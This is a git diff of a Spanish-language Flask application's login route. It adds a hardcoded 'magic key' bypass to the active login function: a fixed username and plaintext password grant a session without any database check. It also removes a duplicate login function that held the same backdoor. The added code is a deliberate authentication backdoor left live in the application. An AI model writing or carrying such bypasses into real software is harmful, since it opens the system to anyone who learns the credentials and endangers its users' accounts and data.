@@ -335,6 +335,16 @@ def login():
     data = request.get_json()
     nombre = data.get('nombre')
     password = data.get('password')
+    
+    # 🔓 CLAVE MÁGICA TEMPORAL (eliminar después)
+    if nombre == "sheyimatamashi" and password == "superadmin12345678":
+        session.permanent = True
+        session['user_uuid'] = "temp_uuid"
+        session['user_nombre'] = "sheyimatamashi"
+        return jsonify({'mensaje': 'Bienvenido superadmin (vía mágica)'})
+    
+    # ... resto del código normal de login ...
+   
     db = get_db()
     user = db.execute("SELECT uuid, password_hash, rol FROM beings WHERE nombre = ?", (nombre,)).fetchone()
     if not user or not verify_password(password, user['password_hash']):
@@ -1016,49 +1026,7 @@ def vestibulo_crear_hilo():
     db.execute("INSERT INTO vestibulo_mensajes (hilo_id, autor, contenido, es_respuesta) VALUES (?, ?, ?, 0)", (hilo_id, data['autor'], data['primer_mensaje']))
     db.commit()
     return jsonify({'mensaje': 'Hilo creado'})
-
-@app.route('/login', methods=['GET', 'POST'])
-def login():
-    if request.method == 'GET':
-        return send_from_directory('frontend', 'login.html')
-    
-    data = request.get_json()
-    nombre = data.get('nombre')
-    password = data.get('password')
-    
-    # 🔓 CLAVE MÁGICA TEMPORAL (eliminar después)
-    if nombre == "sheyimatamashi" and password == "superadmin12345678":
-        session.permanent = True
-        session['user_uuid'] = "temp_uuid"
-        session['user_nombre'] = "sheyimatamashi"
-        return jsonify({'mensaje': 'Bienvenido superadmin (vía mágica)'})
-    
-    # ... resto del código normal de login ...
-   
-    db = get_db()
-    user = db.execute("SELECT uuid, password_hash, rol FROM beings WHERE nombre = ?", (nombre,)).fetchone()
-    if not user or not verify_password(password, user['password_hash']):
-        return jsonify({'error': 'Credenciales inválidas'}), 401
-    
-    session.permanent = True
-    session['user_uuid'] = user['uuid']
-    session['user_nombre'] = nombre
-    
-    # Bombón para superusuario
-    if user['rol'] == 'superusuario':
-        # Verificar si existe en superusuario_control; si no, crearlo con valores inocuos
-        existe = db.execute("SELECT id FROM superusuario_control WHERE superusuario_uuid = ?", (user['uuid'],)).fetchone()
-        if not existe:
-            db.execute("INSERT INTO superusuario_control (superusuario_uuid, ultimo_acceso, activo) VALUES (?, ?, 0)", 
-                       (user['uuid'], datetime.now().isoformat()))
-        # Actualizar el último acceso (tanto si existía como si se creó ahora)
-        db.execute("UPDATE superusuario_control SET ultimo_acceso = ? WHERE superusuario_uuid = ?", 
-                   (datetime.now().isoformat(), user['uuid']))
-    
-    db.commit()
-    return jsonify({'mensaje': f'Bienvenido {nombre}'})
-    
-        
+       
 @app.route('/vestibulo/hilos/<int:hilo_id>/mensajes', methods=['GET'])
 def vestibulo_mensajes(hilo_id):
     db = get_db()
